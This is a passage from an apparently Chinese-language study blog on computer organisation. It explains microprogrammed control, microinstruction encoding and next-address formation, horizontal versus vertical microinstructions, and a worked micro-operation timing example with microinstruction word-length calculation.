CMAR）</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">微</span><span class="mord cjk_fallback">地</span><span class="mord cjk_fallback">址</span><span class="mord cjk_fallback">形</span><span class="mord cjk_fallback">成</span><span class="mord cjk_fallback">部</span><span class="mord cjk_fallback">件</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord cjk_fallback">（</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord cjk_fallback">）</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mi>M</mi><mo stretchy="false">(</mo><mi>C</mi><mi>M</mi><mi>A</mi><mi>R</mi><mo stretchy="false">)</mo><mo>→</mo><mi>C</mi><mi>M</mi><mi>D</mi><mi>R</mi></mrow><annotation encoding="application/x-tex">CM(CMAR)\rightarrow CMDR</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mi>M</mi><mi>D</mi><mi>R</mi></mrow><annotation encoding="application/x-tex">CMDR</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span>发出命令</p><p>形成下一条微指令地址<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">P+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></p></li><li><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mi>d</mi><mo stretchy="false">(</mo><mi>C</mi><mi>M</mi><mi>D</mi><mi>R</mi><mo stretchy="false">)</mo><mo>→</mo><mi>C</mi><mi>M</mi><mi>A</mi><mi>R</mi></mrow><annotation encoding="application/x-tex">Ad(CMDR)\rightarrow CMAR</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mi>M</mi><mo stretchy="false">(</mo><mi>C</mi><mi>M</mi><mi>A</mi><mi>R</mi><mo stretchy="false">)</mo><mo>→</mo><mi>C</mi><mi>M</mi><mi>D</mi><mi>A</mi></mrow><annotation encoding="application/x-tex">CM(CMAR)\rightarrow CMDA</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal">A</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mi>M</mi><mi>D</mi><mi>A</mi></mrow><annotation encoding="application/x-tex">CMDA</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal">A</span></span></span></span>发出命令</p><p>形成下一条微指令地址<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mo>+</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">P+2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span></span></span></span></p></li><li><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mi>d</mi><mo stretchy="false">(</mo><mi>C</mi><mi>M</mi><mi>D</mi><mi>R</mi><mo stretchy="false">)</mo><mo>→</mo><mi>C</mi><mi>M</mi><mi>A</mi><mi>R</mi></mrow><annotation encoding="application/x-tex">Ad(CMDR)\rightarrow CMAR</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mi>M</mi><mo stretchy="false">(</mo><mi>C</mi><mi>M</mi><mi>A</mi><mi>R</mi><mo stretchy="false">)</mo><mo>→</mo><mi>C</mi><mi>M</mi><mi>D</mi><mi>R</mi></mrow><annotation encoding="application/x-tex">CM(CMAR)\rightarrow CMDR</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mi>M</mi><mi>D</mi><mi>R</mi></mrow><annotation encoding="application/x-tex">CMDR</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span>发出命令</p><p>形成下一条微指令地址<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><mo>→</mo><mi>C</mi><mi>M</mi><mi>A</mi><mi>R</mi></mrow><annotation encoding="application/x-tex">M\rightarrow CMAR</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span></p></li></ol><h5 id="取指阶段-2"><a class="markdownIt-Anchor" href="#取指阶段-2"></a> 取指阶段</h5><p>继续执行取指微程序，得到下一条指令</p><p>……</p><h5 id="小结-2"><a class="markdownIt-Anchor" href="#小结-2"></a> 小结</h5><p>通过以上工作原理的实例，我们知道：全部的微指令都保存在CM中，程序执行过程中只需要读出指令。而这一系列操作关键在于：</p><ul><li>微指令的操作控制字段如何形成微操作命令</li><li>微指令的后续地址如何形成</li></ul><p>所以接下来我们来介绍微程序设计如何对微指令进行编码，以及如何形成后续地址。</p><h4 id="微指令的编码方式"><a class="markdownIt-Anchor" href="#微指令的编码方式"></a> 微指令的编码方式</h4><h5 id="直接编码方式"><a class="markdownIt-Anchor" href="#直接编码方式"></a> 直接编码方式</h5><p>即在微指令的操作控制字段中，每一位代表一个微操作命令，某位为“1”代表该控制信号有效。</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240706171522749.png" alt="image-20240706171522749" style="zoom:50%;" /><p>这种方式特点在于：</p><ul><li>速度最快，不需要译码，且设置多个位为“1”可以实现并行处理</li><li>由于每一位都要对应一条微指令，所以微指令需要有2<sup>n</sup>位（假设操作码有n位，对应的译码位数就有2<sup>n</sup>位）</li></ul><h5 id="字段直接编码方式"><a class="markdownIt-Anchor" href="#字段直接编码方式"></a> 字段直接编码方式</h5><p>将微指令的控制字段氛围若干个“段”，每段经过译码后发出控制信号。注意每个译码器一次只能有一个输出为1，因此分到一段中的微操作应当是互斥的。</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240706171918592.png" alt="image-20240706171918592" style="zoom:50%;" /><p>这种方式特点在于：</p><ul><li>显示编码</li><li>缩短了微指令字长，原来需要2<sup>n</sup>位，现在每段中仅需要n为即可，然后再通过译码解释为2<sup>n</sup>位</li><li>由于增加了译码时间，所以微程序执行速度较慢</li></ul><h5 id="字段间接编码方式"><a class="markdownIt-Anchor" href="#字段间接编码方式"></a> 字段间接编码方式</h5><p>即隐式编码，这种编码方式译码时还需要以来其他译码器的译码结果，所以是间接编码。</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240706172325957.png" alt="image-20240706172325957" style="zoom:50%;" /><h5 id="混合编码"><a class="markdownIt-Anchor" href="#混合编码"></a> 混合编码</h5><p>即直接编码和字段编码（直接和间接）混合使用。对于常用的微指令，我们可以采取直接编码加快执行速度；对于不常用的微指令，我们可以用字段编码来减少微指令字长。</p><h4 id="微指令序列地址的形成"><a class="markdownIt-Anchor" href="#微指令序列地址的形成"></a> 微指令序列地址的形成</h4><p>有以下几种方法：</p><ol><li><p>微指令的下地址字段指出</p></li><li><p>根据机器指令的操作码形成</p></li><li><p>增量计数器</p><p>即通常情况下微指令的下地址指向的都是连续的下一条地址，此时只需要把CMDA中的地址+1，而无需将CMDR中的地址部分取回CMDA中</p></li><li><p>分支转移</p><p>即遇到跳转情况时</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240706172828439.png" alt="image-20240706172828439" style="zoom:50%;" /></li><li><p>通过测试网络</p><p>可以用于微程序在小范围内的跳转</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240706172904041.png" alt="image-20240706172904041" style="zoom:50%;" /></li><li><p>由硬件产生微程序入口地址</p><p>比如第一条微指令地址由专门硬件产生，告诉计算机去取指令</p><p>比如中断周期中由硬件产生的中断周期微程序的首地址</p></li></ol><p>经过以上介绍，我们可以把影响微程序序列地址形成的因素归纳如下图所示：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240706173047643.png" alt="image-20240706173047643" style="zoom:50%;" /><p>注意，分支逻辑产生的信号控制多路选择器，由于判断是否发生跳转，转移方式也要送入分支逻辑。</p><h4 id="微指令格式"><a class="markdownIt-Anchor" href="#微指令格式"></a> 微指令格式</h4><p>简答题来咯，注意辨析水平型微指令和垂直型微指令的异同。</p><ul><li><p>水平型微指令：即一次能定义并执行多个并行操作。</p><p>如直接编码、字段直接编码、字段间接编码、直接和字段混合编码</p></li><li><p>垂直型微指令：复杂的微操作，操作间有先后次序。</p><p>一次只能定义一个操作，类似机器指令操作码的方式，由微操作码字段规定微指令的功能</p></li></ul><p>两者的比较：</p><ul><li>水平型微指令比垂直型微指令并行操作能力强，灵活性强</li><li>水平型微指令执行一条机器指令所要的微指令数目少，速度快</li><li>水平型微指令用较短的微程序结构换取较长的微指令结构</li><li>水平型微指令与机器指令差别大</li></ul><table><thead><tr><th>特点</th><th>垂直型微指令 (Vertical Microinstruction)</th><th>水平型微指令 (Horizontal Microinstruction)</th></tr></thead><tbody><tr><td>指令长度</td><td>窄位指令，使用操作码编码控制信号</td><td>宽位指令，每位或每组位直接控制硬件信号</td></tr><tr><td>并行性</td><td>较低，通过解码器生成的控制信号较少</td><td>高，可以同时激活多个控制信号</td></tr><tr><td>灵活性</td><td>相对较低，通过解码器生成控制信号</td><td>高，可以更细粒度地控制硬件部件</td></tr><tr><td>实现复杂性</td><td>需要解码器来解释操作码，设计更为复杂</td><td>实现相对简单，直接控制信号</td></tr><tr><td>适用场景</td><td>适用于需要节省指令存储空间的场合</td><td>适用于需要高并行性的场合</td></tr></tbody></table><blockquote><h2 id="例子"><a class="markdownIt-Anchor" href="#例子"></a> 例子</h2><h3 id="水平型微指令-horizontal-microinstruction"><a class="markdownIt-Anchor" href="#水平型微指令-horizontal-microinstruction"></a> 水平型微指令 (Horizontal Microinstruction)</h3><p>假设有以下控制信号：</p><ul><li>读取内存：Memory Read (MR)</li><li>写入内存：Memory Write (MW)</li><li>加载累加器：Load Accumulator (LA)</li><li>存储累加器：Store Accumulator (SA)</li></ul><p>示例微指令：</p><table><thead><tr><th>MR</th><th>MW</th><th>LA</th><th>SA</th></tr></thead><tbody><tr><td>1</td><td>0</td><td>1</td><td>0</td></tr></tbody></table><p>这条微指令表示同时进行“读取内存”和“加载累加器”的操作。</p><h3 id="垂直型微指令-vertical-microinstruction"><a class="markdownIt-Anchor" href="#垂直型微指令-vertical-microinstruction"></a> 垂直型微指令 (Vertical Microinstruction)</h3><p>假设有以下操作码和对应的控制信号：</p><ul><li>00: 读取内存 (MR)</li><li>01: 写入内存 (MW)</li><li>10: 加载累加器 (LA)</li><li>11: 存储累加器 (SA)</li></ul><p>示例微指令：10</p><p>这条微指令通过解码器生成控制信号“加载累加器”。</p></blockquote><h4 id="静态和动态微程序设计"><a class="markdownIt-Anchor" href="#静态和动态微程序设计"></a> 静态和动态微程序设计</h4><p>静态微程序设计，即微程序无须改变，直接存储在ROM中。</p><p>动态微程序设计，允许修改、扩展指令集，通过修改微程序的方式，在控制存储器中写入新的指令在执行阶段的微程序。一般为了保证兼容性，很少进行修改，而是直接扩展。</p><p>十分有利与指令仿真。增加或修改一条指令，看下改变之后的体系结构运行某类应用程序性能是否较大提升，生成下批处理器时，就可以改变指令集</p><p>一般采取EPROM。</p><h4 id="毫微程序设计"><a class="markdownIt-Anchor" href="#毫微程序设计"></a> 毫微程序设计</h4><p>毫微程序概念的理解可以参考微程序和机器指令的关系：</p><ul><li>微程序设计用微程序解释机器指令</li><li>毫微程序设计用毫微程序解释微程序</li></ul><p>当微指令比较复杂，并且这个操作内部的毫微操作也有一定的先后顺序时，就需要考虑毫微程序的设计。</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240706194837556.png" alt="image-20240706194837556" style="zoom:50%;" /><p>这里放出毫微程序的设计结构图进行参考，并不是重点，仅做了解。</p><p>可以看到，毫微程序设计和微程序设计之间类似套娃的关系，又是一层新的抽象。</p><h4 id="串行和并行微程序控制"><a class="markdownIt-Anchor" href="#串行和并行微程序控制"></a> 串行和并行微程序控制</h4><p>参考下图：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240706195032652.png" alt="image-20240706195032652" style="zoom:50%;" /><p>可以通过流水的方式加快微指令执行效率。</p><h4 id="微程序设计举例"><a class="markdownIt-Anchor" href="#微程序设计举例"></a> 微程序设计举例</h4><p>最后的波纹了！</p><p>照例，我们需要先对指令的每个阶段进行微操作分析，然后再画出码点图。假设CPU结构和组合逻辑相同，且为非总线结构。</p><h5 id="写出对应机器指令的微操作及节拍安排"><a class="markdownIt-Anchor" href="#写出对应机器指令的微操作及节拍安排"></a> 写出对应机器指令的微操作及节拍安排</h5><p>这里只给出取值周期和执行周期中的节拍安排，整理列表如下：</p><p>取指周期：</p><table><thead><tr><th>时间周期</th><th>微操作</th></tr></thead><tbody><tr><td>T0</td><td>PC → MAR / 1 → R</td></tr><tr><td>T1</td><td><font style="color:red">Ad(CMDR) → CMAR</font></td></tr><tr><td>T2</td><td>M(MAR) → MDR / (PC)+1 → PC</td></tr><tr><td>T3</td><td><font style="color:red">Ad(CMDR) → CMAR</font></td></tr><tr><td>T4</td><td>MDR → IR / OP(IR) → 微地址形成部件</td></tr><tr><td>T5</td><td><font style="color:red">OP(IR) → 微地址形成部件 → CMAR</font></td></tr></tbody></table><p>执行周期：</p><p>执行阶段最后一条微指令的下地址应当是M，需要把下地址取出送入CMAR</p><table><thead><tr><th>指令</th><th>时间周期</th><th>微操作</th></tr></thead><tbody><tr><td>CLA</td><td>T0</td><td>0 → AC</td></tr><tr><td></td><td>T1</td><td><font style="color:red">Ad(CMDR) → CMAR</font></td></tr><tr><td>COM</td><td>T0</td><td>AC → AC</td></tr><tr><td></td><td>T1</td><td><font style="color:red">Ad(CMDR) → CMAR</font></td></tr><tr><td>SHR</td><td>T0</td><td>L(AC) → R(AC) / AC0 → AC0</td></tr><tr><td></td><td>T1</td><td><font style="color:red">Ad(CMDR) → CMAR</font></td></tr><tr><td>CSL</td><td>T0</td><td>R(AC) → L(AC) / AC0 → ACn</td></tr><tr><td></td><td>T1</td><td><font style="color:red">Ad(CMDR) → CMAR</font></td></tr><tr><td>STP</td><td>T0</td><td>0 → G</td></tr><tr><td></td><td>T1</td><td><font style="color:red">Ad(CMDR) → CMAR</font></td></tr><tr><td>ADD</td><td>T0</td><td>Ad(IR) → MAR / 1 → R</td></tr><tr><td></td><td>T1</td><td><font style="color:red">Ad(CMDR) → CMAR</font></td></tr><tr><td></td><td>T2</td><td>M(MAR) → MDR</td></tr><tr><td></td><td>T3</td><td><font style="color:red">Ad(CMDR) → CMAR</font></td></tr><tr><td></td><td>T4</td><td>(AC) + (MDR) → AC</td></tr><tr><td></td><td>T5</td><td><font style="color:red">Ad(CMDR) → CMAR</font></td></tr><tr><td>STA</td><td>T0</td><td>Ad(IR) → MAR / 1 → W</td></tr><tr><td></td><td>T1</td><td><font style="color:red">Ad(CMDR) → CMAR</font></td></tr><tr><td></td><td>T2</td><td>AC → MDR</td></tr><tr><td></td><td>T3</td><td><font style="color:red">Ad(CMDR) → CMAR</font></td></tr><tr><td></td><td>T4</td><td>MDR → M(MAR)</td></tr><tr><td></td><td>T5</td><td><font style="color:red">Ad(CMDR) → CMAR</font></td></tr><tr><td>LDA</td><td>T0</td><td>Ad(IR) → MAR / 1 → R</td></tr><tr><td></td><td>T1</td><td><font style="color:red">Ad(CMDR) → CMAR</font></td></tr><tr><td></td><td>T2</td><td>M(MAR) → MDR</td></tr><tr><td></td><td>T3</td><td><font style="color:red">Ad(CMDR) → CMAR</font></td></tr><tr><td></td><td>T4</td><td>MDR → AC</td></tr><tr><td></td><td>T5</td><td><font style="color:red">Ad(CMDR) → CMAR</font></td></tr><tr><td>JMP</td><td>T0</td><td>Ad(IR) → PC</td></tr><tr><td></td><td>T1</td><td><font style="color:red">Ad(CMDR) → CMAR</font></td></tr><tr><td>BAN</td><td>T0</td><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>A</mi><mn>0</mn></msub><mo separator="true">⋅</mo><mi>A</mi><mi>d</mi><mo stretchy="false">(</mo><mi>I</mi><mi>R</mi><mo stretchy="false">)</mo><mo>+</mo><mover accent="true"><msub><mi>A</mi><mn>0</mn></msub><mo stretchy="true">‾</mo></mover><mo separator="true">⋅</mo><mo stretchy="false">(</mo><mi>P</mi><mi>C</mi><mo stretchy="false">)</mo><mo>→</mo><mi>P</mi><mi>C</mi></mrow><annotation encoding="application/x-tex">A_0·Ad(IR)+\overline{A_0}·(PC)\rightarrow PC</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.13333em;vertical-align:-0.25em;"></span><span class="mord overline"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8833300000000001em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.80333em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span></span></span></span></td></tr><tr><td></td><td>T1</td><td><font style="color:red">Ad(CMDR) → CMAR</font></td></tr></tbody></table><p>上述共有20个微操作，38条微指令。</p><p>如果用水平型编码，直接编码，每一个微操作都需要操作控制字段中1位来表示。要在控制存储器内寻址，下地址字段长度和控制存储器大小相关，38条微指令需38个存储单元。</p><h5 id="确定微指令格式"><a class="markdownIt-Anchor" href="#确定微指令格式"></a> 确定微指令格式</h5><ul><li><p>假设微指令的编码方式：采取水平直接控制</p></li><li><p>后续微指令的地址形成方式：</p><p>由机器指令的操作码通过微地址形成部件形成</p><p>由微指令的下地址字段直接给出</p></li><li><p>微指令字长</p><p>由20个微操作，确定操作控制字段最少为20位</p><p>由38条微指令，确定微指令的下地址字段为6位</p><p>微指令字长可取<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>20</mn><mo>+</mo><mn>6</mn><mo>=</mo><mn>26</mn></mrow><annotation encoding="application/x-tex">20+6=26</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">6</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">6</span></span></span></span>位</p></li><li><p>微指令字长的优化</p><p>38条微指令中有19条是关于后续微指令地址 → CMAR</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext> 其中 </mtext><mrow><mo fence="true">{</mo><mtable rowspacing="0.15999999999999992em" columnalign="left right" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>1</mn><mtext> 条 </mtext></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext> OP </mtext><mo stretchy="false">(</mo><mtext> IR </mtext><mo stretchy="false">)</mo><mo>⟶</mo><mtext> 微地址形成部件 </mtext><mo>⟶</mo><mtext> CMAR 